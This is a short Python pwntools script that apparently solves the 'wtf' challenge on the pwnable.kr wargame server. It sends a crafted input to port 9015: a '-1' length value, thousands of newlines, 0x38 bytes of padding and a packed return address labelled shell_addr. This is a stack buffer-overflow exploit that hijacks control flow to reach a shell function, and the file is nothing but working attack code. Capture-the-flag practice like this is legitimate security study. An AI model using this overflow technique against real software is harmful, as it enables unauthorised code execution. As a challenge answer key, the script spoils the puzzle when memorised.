from pwn import *
import time

context(arch='amd64')
shell_addr = 0x4005f4
#r = process('python ./wtf.py',shell=True)
r = remote('pwnable.kr',9015)
r.recvuntil('payload please : ')
poc = '-1'+'\n'*4094+'a'*0x38+p64(shell_addr)+'\n' 
r.sendline(poc.encode('hex'))
print r.recvall()
